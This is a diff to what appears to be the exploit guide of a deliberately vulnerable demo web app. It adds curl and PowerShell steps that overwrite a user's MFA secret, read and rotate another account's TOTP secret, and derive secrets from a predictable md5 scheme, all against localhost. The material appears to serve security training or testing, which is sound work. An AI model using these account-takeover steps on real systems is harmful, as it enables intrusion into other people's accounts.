@@ -527,6 +527,13 @@ USER_ID=$(curl -s http://localhost:8888/api/v3/users/1 2>/dev/null || \
 curl -X PUT http://localhost:8888/api/v3/users/$USER_ID \
   -H "Content-Type: application/json" \
   -d '{"enabled":false,"locked":true,"mfaType":"MFA_NONE"}'
+
+# Overwrite the signed-in user's MFA secret through profile editing (CWE-915)
+curl -s -c user-cookies.txt -o /dev/null http://localhost:8888/login \
+  -d 'username=user1&password=Password123!'
+curl -s -b user-cookies.txt -X POST http://localhost:8888/user/edit-profile \
+  -d 'appReturnTo=%2Fapp%2Fuser%2Fprofile&mfaType=MFA_APP&mfaSecret=JBSWY3DPEHPK3PXP' -o /dev/null
+curl -s -b user-cookies.txt http://localhost:8888/api/v3/account/summary | jq '.data.user | {mfaType, mfaSecret}'
 ```
 
 ### PowerShell
@@ -535,7 +542,19 @@ curl -X PUT http://localhost:8888/api/v3/users/$USER_ID \
 $body = @{ enabled = $false; locked = $true; mfaType = 'MFA_NONE' } | ConvertTo-Json
 Invoke-RestMethod -Method Put -Uri 'http://localhost:8888/api/v3/users/1' `
   -ContentType 'application/json' -Body $body
+
+# Overwrite the signed-in user's MFA secret through profile editing (CWE-915)
+$userSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+Invoke-WebRequest -Method Post -Uri http://localhost:8888/login -WebSession $userSession `
+  -Body @{ username = 'user1'; password = 'Password123!' } -MaximumRedirection 10 | Out-Null
+Invoke-WebRequest -Method Post -Uri http://localhost:8888/user/edit-profile -WebSession $userSession `
+  -Body @{ appReturnTo = '/app/user/profile'; mfaType = 'MFA_APP'; mfaSecret = 'JBSWY3DPEHPK3PXP' } `
+  -MaximumRedirection 10 | Out-Null
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/account/summary -WebSession $userSession).data.user |
+  Select-Object mfaType, mfaSecret
 ```
+
+**Expected (profile edit):** The summary shows `mfaType` as `MFA_APP` and `mfaSecret` as `JBSWY3DPEHPK3PXP`; the profile form changed the stored MFA secret without using the MFA enrollment flow.
 
 **Expected:** User updated without any auth token.
 
@@ -1242,11 +1261,12 @@ expiry, so the full six-digit keyspace can be enumerated against a live account.
 node -e "const c=require('crypto');const A='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';const d=c.createHash('md5').update('iwa-demo-totp-salt:user1').digest();let b=0,v=0,o='';for(const x of d){v=(v<<8)|x;b+=8;while(b>=5){o+=A[(v>>>(b-5))&31];b-=5;}}if(b>0)o+=A[(v<<(5-b))&31];console.log(o);"
 ```
 
-enough to generate valid codes forever. OTP codes additionally come from `Math.random()` (CWE-338).
-**Expected:** The printed secret matches the one returned by `/api/v3/mfa/status/user1`. Every enrolment
-secret in the application is `base32(md5("iwa-demo-totp-salt:" + username))`, so knowing a username is
-enough to generate valid codes forever. The `mfaToken` in the `202` sign-in response is also predictable
-because it contains the account id and current timestamp. OTP codes additionally come from `Math.random()` (CWE-338).
+**Expected:** The printed secret matches the seeded/initial secret returned by `/api/v3/mfa/status/user1`.
+Initial secrets are `base32(md5("iwa-demo-totp-salt:" + username))`; each rotation is
+`base32(md5("iwa-demo-totp-salt:" + username + ":" + previousSecret))`. Knowing the username and current
+secret is enough to predict the next secret and generate valid codes. The `mfaToken` in the `202` sign-in
+response is also predictable because it contains the account id and current timestamp. OTP codes additionally
+come from `Math.random()` (CWE-338).
 
 ---
 
@@ -1324,18 +1344,30 @@ button does the same thing from the challenge screen. Re-enable with
 
 ```bash
 curl -s -b cookies.txt 'http://localhost:8888/user/security/totp-secret?userId=admin' | jq .data
+
+BEFORE=$(curl -s -b cookies.txt 'http://localhost:8888/user/security/totp-secret?userId=admin' | jq -r .data.secret)
+curl -s -b cookies.txt -X POST http://localhost:8888/user/security/regenerate-totp \
+  -d 'userId=admin&appReturnTo=%2Fapp%2Fuser%2Fprofile' -o /dev/null
+AFTER=$(curl -s -b cookies.txt 'http://localhost:8888/user/security/totp-secret?userId=admin' | jq -r .data.secret)
+printf 'before=%s\nafter=%s\n' "$BEFORE" "$AFTER"
 ```
 
 ### PowerShell
 
 ```powershell
 (Invoke-RestMethod -Uri 'http://localhost:8888/user/security/totp-secret?userId=admin' -WebSession $session).data
+$before = (Invoke-RestMethod -Uri 'http://localhost:8888/user/security/totp-secret?userId=admin' -WebSession $session).data.secret
+Invoke-WebRequest -Method Post -Uri http://localhost:8888/user/security/regenerate-totp `
+  -WebSession $session -Body @{ userId = 'admin'; appReturnTo = '/app/user/profile' } | Out-Null
+$after = (Invoke-RestMethod -Uri 'http://localhost:8888/user/security/totp-secret?userId=admin' -WebSession $session).data.secret
+"before=$before`nafter=$after"
 ```
 
 **Expected:** Signed in as `user1`, the response contains the `admin` account's TOTP secret, QR code and
 current code. The same control is exposed in the UI: `/app/user/profile` → "Authenticator Setup" →
-"View another account's setup". `POST /user/security/regenerate-totp` with `userId=admin` additionally
-rotates the admin secret, locking the real owner out.
+"View another account's setup". `POST /user/security/regenerate-totp` with `userId=admin` rotates the
+admin secret to a different, predictably derived value, locking the real owner out. The before/after
+commands above demonstrate that each sequential rotation changes the secret.
 
 ---
 
